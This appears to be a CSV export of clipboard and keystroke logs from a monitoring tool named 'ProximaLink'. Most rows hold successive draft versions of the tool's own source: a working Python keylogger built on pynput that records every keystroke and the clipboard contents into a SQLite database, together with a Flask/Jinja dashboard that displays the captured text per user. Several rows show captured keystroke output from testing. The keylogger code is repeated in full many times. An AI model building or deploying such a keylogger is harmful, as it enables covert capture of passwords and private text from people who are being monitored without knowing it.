Timestamp,Username,IP,Data
7/2/2024 9:04,Toshiba,192.168.100.200,"<!DOCTYPE html>
<html lang=""en"">
  <head>
    <meta charset=""UTF-8"" />
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
    <title>ProximaLink Dashboard</title>
    <link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"" />
    <link rel=""stylesheet"" href=""{{ url_for('static', filename='styles.css') }}"" />
  </head>
  <body>
    <header class=""bg-primary text-white text-center py-3"">
      <h1>ProximaLink Dashboard</h1>
      <p>Welcome to the monitoring dashboard.</p>
    </header>
    <div class=""container-fluid"">
      <div class=""row"">
        <aside class=""col-md-2 bg-light py-3"">
          <h2>Users</h2>
          <ul class=""list-unstyled"">
            {% if unique_users %}
              {% for user in unique_users %}
                <li class=""user-item"">{{ user }}</li>
              {% endfor %}
            {% else %}
              <p>No users found yet.</p>
            {% endif %}
          </ul>
        </aside>
        <main class=""col-md-10 py-3"">
          {% if user_logs %}
            {% for user, logs in user_logs.items() %}
              <section class=""user-section"">
                <h2>{{ user[0] }}</h2>
                <p>{{ user[1] }}</p>
                <div class=""row row-data"">
                  {% for log in logs %}
                    <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
                      <p>{{ log.text }}</p>
                      <p class=""timestamp text-right"">{{ log.timestamp }}</p>
                    </div>
                  {% endfor %}
                </div>
              </section>
            {% endfor %}
          {% endif %}
          {% if clipboard_logs %}
            {% for user, logs in clipboard_logs.items() %}
              <section class=""user-section"">
                <h2>{{ user[0] }}</h2>
                <p>{{ user[1] }}</p>
                <div class=""row row-data"">
                  {% for log in logs %}
                    <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
                      <p>{{ log.text }}</p>
                      <p class=""timestamp text-right"">{{ log.timestamp }}</p>
                    </div>
                  {% endfor %}
                </div>
              </section>
            {% endfor %}
          {% else %}
            <div class=""alert alert-info text-center"" role=""alert"">
              No logs found yet. Monitor activity for data to appear.
            </div>
          {% endif %}
        </main>
      </div>
    </div>
    <footer class=""bg-primary text-white text-center py-3 mt-3"">
      <p>ProximaLink Monitoring &copy; 2024</p>
    </footer>
    <script src=""https://code.jquery.com/jquery-3.5.1.slim.min.js""></script>
    <script src=""https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js""></script>
    <script src=""https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js""></script>
  </body>
</html>
"
7/2/2024 9:05,Toshiba,192.168.100.200,Clipboard
7/2/2024 9:05,Toshiba,192.168.100.200,"Toshiba
192.168.100.200

Keystroke: Key.f5

2024-07-02 09:05:36

Keystroke: Key.f5

2024-07-02 09:05:29

Keystroke: Key.enter

2024-07-02 09:05:23

Keystroke: i

2024-07-02 09:05:22

Keystroke: n

2024-07-02 09:05:22

Keystroke: g

2024-07-02 09:05:22

Keystroke: Key.space

2024-07-02 09:05:22

Keystroke: o

2024-07-02 09:05:22

Keystroke: k

2024-07-02 09:05:22

Keystroke: '

2024-07-02 09:05:21

Keystroke: s

2024-07-02 09:05:21

Keystroke: Key.space

2024-07-02 09:05:21

Keystroke: w

2024-07-02 09:05:21

Keystroke: o

2024-07-02 09:05:21

Keystroke: r

2024-07-02 09:05:21

Keystroke: k

2024-07-02 09:05:21

Keystroke: f"
7/2/2024 9:08,Toshiba,192.168.100.200,"try:
        if hasattr(key, 'char') and key.char is not None:
            sentence_buffer.append(key.char)
        else:
            if key in special_keys:
                if key == keyboard.Key.enter:
                    sentence_buffer.append(special_keys[key])
                    log_sentence(''.join(sentence_buffer))
                    sentence_buffer = []
                elif key == keyboard.Key.space:
                    sentence_buffer.append(' ')
                else:
                    sentence_buffer.append(special_keys[key])
            else:
                sentence_buffer.append(f""[{key}]"")

        # If the buffer is too large, log it as a sentence
        if len(sentence_buffer) > 50:
            log_sentence(''.join(sentence_buffer))
            sentence_buffer = []"
7/2/2024 9:11,Toshiba,192.168.100.200,"try:
        if hasattr(key, 'char') and key.char is not None:
            sentence_buffer.append(key.char)
        else:
            if key in special_keys:
                if key == keyboard.Key.enter:
                    sentence_buffer.append(special_keys[key])
                    log_sentence(''.join(sentence_buffer))
                    sentence_buffer = []
                elif key == keyboard.Key.space:
                    sentence_buffer.append(' ')
                else:
                    sentence_buffer.append(special_keys[key])
            else:
                sentence_buffer.append(f""[{key}]"")

        # If the buffer is too large, log it as a sentence
        if len(sentence_buffer) > 50:
            log_sentence(''.join(sentence_buffer))
            sentence_buffer = []"
7/2/2024 9:12,Toshiba,192.168.100.200,pressed_keys
7/2/2024 9:13,Toshiba,192.168.100.200,pressed_keys
7/2/2024 9:15,Toshiba,192.168.100.200,pressed_keys
7/2/2024 9:16,Toshiba,192.168.100.200,"Toshiba
192.168.100.200

Keystroke: in

2024-07-02 09:16:18

Keystroke: king aga

2024-07-02 09:16:15

Keystroke: not wor

2024-07-02 09:16:14

Keystroke:"
7/2/2024 9:16,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = ""keylogs.db""


def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()


# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l: ""Ctrl"",
    keyboard.Key.ctrl_r: ""Ctrl"",
    keyboard.Key.shift: ""Shift"",
    keyboard.Key.shift_r: ""Shift"",
    keyboard.Key.alt: ""Alt"",
    keyboard.Key.alt_gr: ""AltGr"",
    keyboard.Key.tab: ""Tab"",
    keyboard.Key.caps_lock: ""CapsLock"",
    keyboard.Key.delete: ""Delete"",
    keyboard.Key.esc: ""Esc"",
    keyboard.Key.up: ""Up"",
    keyboard.Key.down: ""Down"",
    keyboard.Key.left: ""Left"",
    keyboard.Key.right: ""Right"",
}

pressed_keys = set()
is_modifier_active = False


def on_release(key):
    global pressed_keys, is_modifier_active, buffer, last_time
    if key in modifier_keys.keys():
        pressed_keys.discard(key)
        is_modifier_active = any(k in modifier_keys for k in pressed_keys)

    # Capture keystrokes
    try:
        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
        elif key == keyboard.Key.space:
            buffer.append("" "")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
            log_sentence("""".join(buffer))
            buffer = []

        # If the buffer is too large, log it as a sentence
        if len(buffer) > 4:

            current_time = time.time()
            if current_time - last_time > 1:
                log_sentence("""".join(buffer))
                buffer = []
                last_time = current_time
                print("""".join(buffer))
    except Exception as e:
        print(f""Error logging keystroke: {e}"")

    # Capture clipboard changes
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")


# Start listening to keyboard events
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()
    print(""Listening..."")
"
7/2/2024 9:19,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = ""keylogs.db""

def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()

# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l: ""Ctrl"",
    keyboard.Key.ctrl_r: ""Ctrl"",
    keyboard.Key.shift: ""Shift"",
    keyboard.Key.shift_r: ""Shift"",
    keyboard.Key.alt: ""Alt"",
    keyboard.Key.alt_gr: ""AltGr"",
    keyboard.Key.tab: ""Tab"",
    keyboard.Key.caps_lock: ""CapsLock"",
    keyboard.Key.delete: ""Delete"",
    keyboard.Key.esc: ""Esc"",
    keyboard.Key.up: ""Up"",
    keyboard.Key.down: ""Down"",
    keyboard.Key.left: ""Left"",
    keyboard.Key.right: ""Right"",
}

special_keys = {
    keyboard.Key.enter: ""\n"",
    keyboard.Key.space: "" "",
    keyboard.Key.tab: ""\t"",
    keyboard.Key.backspace: ""[BACKSPACE]""
}

def on_release(key):
    global buffer, last_time
    try:
        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key in special_keys:
            buffer.append(special_keys[key])
            if key == keyboard.Key.enter:
                log_sentence("""".join(buffer))
                buffer = []
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        else:
            buffer.append(f""[{key}]"")

        current_time = time.time()
        if current_time - last_time > 1:
            log_sentence("""".join(buffer))
            buffer = []
            last_time = current_time
    except Exception as e:
        print(f""Error logging keystroke: {e}"")

    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")

# Start listening to keyboard events
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:22,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = ""keylogs.db""

def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()

# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l: ""Ctrl"",
    keyboard.Key.ctrl_r: ""Ctrl"",
    keyboard.Key.shift: ""Shift"",
    keyboard.Key.shift_r: ""Shift"",
    keyboard.Key.alt: ""Alt"",
    keyboard.Key.alt_gr: ""AltGr"",
    keyboard.Key.tab: ""Tab"",
    keyboard.Key.caps_lock: ""CapsLock"",
    keyboard.Key.delete: ""Delete"",
    keyboard.Key.esc: ""Esc"",
    keyboard.Key.up: ""Up"",
    keyboard.Key.down: ""Down"",
    keyboard.Key.left: ""Left"",
    keyboard.Key.right: ""Right"",
}

special_keys = {
    keyboard.Key.enter: ""\n"",
    keyboard.Key.space: "" "",
    keyboard.Key.tab: ""\t"",
    keyboard.Key.backspace: ""[BACKSPACE]""
}

def on_release(key):
    global buffer, last_time
    try:
        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key in special_keys:
            buffer.append(special_keys[key])
            if key == keyboard.Key.enter:
                log_sentence("""".join(buffer))
                buffer = []
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        else:
            buffer.append(f""[{key}]"")

        current_time = time.time()
        if current_time - last_time > 1:
            log_sentence("""".join(buffer))
            buffer = []
            last_time = current_time
    except Exception as e:
        print(f""Error logging keystroke: {e}"")

    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")

# Start listening to keyboard events
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:24,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = ""keylogs.db""


def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()


# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l: ""Ctrl"",
    keyboard.Key.ctrl_r: ""Ctrl"",
    keyboard.Key.shift: ""Shift"",
    keyboard.Key.shift_r: ""Shift"",
    keyboard.Key.alt: ""Alt"",
    keyboard.Key.alt_gr: ""AltGr"",
    keyboard.Key.tab: ""Tab"",
    keyboard.Key.caps_lock: ""CapsLock"",
    keyboard.Key.delete: ""Delete"",
    keyboard.Key.esc: ""Esc"",
    keyboard.Key.up: ""Up"",
    keyboard.Key.down: ""Down"",
    keyboard.Key.left: ""Left"",
    keyboard.Key.right: ""Right"",
}


def on_release(key):
    global buffer, last_time
    try:
        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_sentence("""".join(buffer))
            buffer = []
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        elif key == keyboard.Key.space:
            buffer.append("" "")
            log_sentence("""".join(buffer))
            buffer = []
        elif key in modifier_keys:
            modifier = modifier_keys[key]
            buffer.append(f""[{modifier}]"")

        current_time = time.time()
        if current_time - last_time > 1:
            log_sentence("""".join(buffer))
            buffer = []
            last_time = current_time
    except Exception as e:
        print(f""Error logging keystroke: {e}"")

    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")


# Start listening to keyboard events
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:27,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = ""keylogs.db""

def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()

# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.alt, keyboard.Key.alt_gr, keyboard.Key.tab, keyboard.Key.caps_lock,
    keyboard.Key.delete, keyboard.Key.esc, keyboard.Key.up, keyboard.Key.down,
    keyboard.Key.left, keyboard.Key.right
}

def log_buffer():
    global buffer
    if buffer:
        log_sentence("""".join(buffer))
        buffer = []

def on_release(key):
    global buffer, last_time
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
            log_buffer()
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()

        # Log the buffer if a second has passed since the last keystroke
        current_time = time.time()
        if current_time - last_time > 1:
            log_buffer()
            last_time = current_time
    except Exception as e:
        print(f""Error logging keystroke: {e}"")

    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")

# Start listening to keyboard events
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:27,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = ""keylogs.db""

def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()

# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.alt, keyboard.Key.alt_gr, keyboard.Key.tab, keyboard.Key.caps_lock,
    keyboard.Key.delete, keyboard.Key.esc, keyboard.Key.up, keyboard.Key.down,
    keyboard.Key.left, keyboard.Key.right
}

def log_buffer():
    global buffer
    if buffer:
        log_sentence("""".join(buffer))
        buffer = []

def on_release(key):
    global buffer, last_time
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
            log_buffer()
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()

        # Log the buffer if a second has passed since the last keystroke
        current_time = time.time()
        if current_time - last_time > 1:
            log_buffer()
            last_time = current_time
    except Exception as e:
        print(f""Error logging keystroke: {e}"")

    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")

# Start listening to keyboard events
with keyboard.Listener(on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:28,Toshiba,192.168.100.200,"Keystroke logged: this
Keystroke logged: is
Keystroke logged: not
Keystroke logged: g
Keystroke logged: ood
Keystroke logged: ata
Keystroke logged: all"
7/2/2024 9:28,Toshiba,192.168.100.200,"Toshiba
192.168.100.200

Keystroke: v

2024-07-02 09:28:06

Keystroke: all

2024-07-02 09:28:00

Keystroke: ood

2024-07-02 09:27:59

Keystroke: ata

2024-07-02 09:27:59

Keystroke: not

2024-07-02 09:27:58

Keystroke: g

2024-07-02 09:27:58

Keystroke: this"
7/2/2024 9:34,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = ""keylogs.db""

def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()

# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.alt, keyboard.Key.alt_gr, keyboard.Key.tab, keyboard.Key.caps_lock,
    keyboard.Key.delete, keyboard.Key.esc, keyboard.Key.up, keyboard.Key.down,
    keyboard.Key.left, keyboard.Key.right
}

def log_buffer():
    global buffer
    if buffer:
        log_sentence("""".join(buffer))
        buffer = []

def on_press(key):
    global buffer, last_time
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
            log_buffer()
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()

        # Log the buffer if a second has passed since the last keystroke
        current_time = time.time()
        if current_time - last_time > 1:
            log_buffer()
            last_time = current_time
    except Exception as e:
        print(f""Error logging keystroke: {e}"")

def on_release(key):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:34,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = ""keylogs.db""

def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()

# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.alt, keyboard.Key.alt_gr, keyboard.Key.tab, keyboard.Key.caps_lock,
    keyboard.Key.delete, keyboard.Key.esc, keyboard.Key.up, keyboard.Key.down,
    keyboard.Key.left, keyboard.Key.right
}

def log_buffer():
    global buffer
    if buffer:
        log_sentence("""".join(buffer))
        buffer = []

def on_press(key):
    global buffer, last_time
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
            log_buffer()
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()

        # Log the buffer if a second has passed since the last keystroke
        current_time = time.time()
        if current_time - last_time > 1:
            log_buffer()
            last_time = current_time
    except Exception as e:
        print(f""Error logging keystroke: {e}"")

def on_release(key):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:35,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence

# Database setup
DB_FILE = ""keylogs.db""

def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()

# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.alt, keyboard.Key.alt_gr, keyboard.Key.tab, keyboard.Key.caps_lock,
    keyboard.Key.delete, keyboard.Key.esc, keyboard.Key.up, keyboard.Key.down,
    keyboard.Key.left, keyboard.Key.right
}

def log_buffer():
    global buffer
    if buffer:
        log_sentence("""".join(buffer))
        buffer = []

def on_press(key):
    global buffer, last_time
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
            log_buffer()
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()

        # Log the buffer if a second has passed since the last keystroke
        current_time = time.time()
        if current_time - last_time > 1:
            log_buffer()
            last_time = current_time
    except Exception as e:
        print(f""Error logging keystroke: {e}"")

def on_release(key):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:38,Toshiba,192.168.100.200,"Keystroke logged: tring
Keystroke logged: and
Keystroke logged: ca
Keystroke logged: does
Keystroke logged: not
Keystroke logged: wait
Keystroke logged: for
Keystroke logged: the
Keystroke logged: s
Keystroke logged: entence
Keystroke logged: to
Keystroke logged: complete
Keystroke logged: bu
Keystroke logged: t
Keystroke logged: breaking
Keystroke logged: it
Keystroke logged: nto
Keystroke logged: the
Keystroke logged: p
Keystroke logged: iece
Keystroke logged: like
Keystroke logged: this"
7/2/2024 9:39,Toshiba,192.168.100.200,"buffer = []

def log_sentence_buffer():
    global buffer
    if buffer:
        sentence = ''.join(buffer)
        log_sentence(sentence)
        buffer = []

def on_press(key):
    global buffer
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_sentence_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()

    except Exception as e:
        print(f""Error logging keystroke: {e}"")
"
7/2/2024 9:40,Toshiba,192.168.100.200,"def log_sentence_buffer():
    global buffer
    if buffer:
        sentence = ''.join(buffer)
        log_sentence(sentence)
        buffer = []
"
7/2/2024 9:40,Toshiba,192.168.100.200,"def on_press(key):
    global buffer
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_sentence_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()

    except Exception as e:
        print(f""Error logging keystroke: {e}"")"
7/2/2024 9:40,Toshiba,192.168.100.200,"def on_press(key):
    global buffer
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_sentence_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()

    except Exception as e:
        print(f""Error logging keystroke: {e}"")"
7/2/2024 9:42,Toshiba,192.168.100.200,"sentence = re.sub(r'\s+', ' ', sentence.replace('\n', ' '))"
7/2/2024 9:50,Toshiba,192.168.100.200,"<div class=""row row-data"">
      {% for log in clipboard_logs %}
      <div class=""col-md-8 log-entry my-2 p-2 border rounded"">
        <p>{{ log.text }}</p>
        <p class=""timestamp text-right"">{{ log.timestamp }}</p>
      </div>"
7/2/2024 9:50,Toshiba,192.168.100.200,"else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))"
7/2/2024 9:51,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence
import re

# Database setup
DB_FILE = ""keylogs.db""


def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()


# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.alt,
    keyboard.Key.alt_gr,
    keyboard.Key.tab,
    keyboard.Key.caps_lock,
    keyboard.Key.delete,
    keyboard.Key.esc,
    keyboard.Key.up,
    keyboard.Key.down,
    keyboard.Key.left,
    keyboard.Key.right,
}


def log_buffer():
    global buffer
    if buffer:
        sentence = """".join(buffer)
        sentence = re.sub(r""\s+"", "" "", sentence.replace(""\n"", "" ""))
        log_sentence(sentence)
        buffer = []


def on_press(key):
    global buffer
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()
                return

    except Exception as e:
        print(f""Error logging keystroke: {e}"")


def on_release(key):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")


# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"
7/2/2024 9:51,Toshiba,192.168.100.200,"else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()
                return"
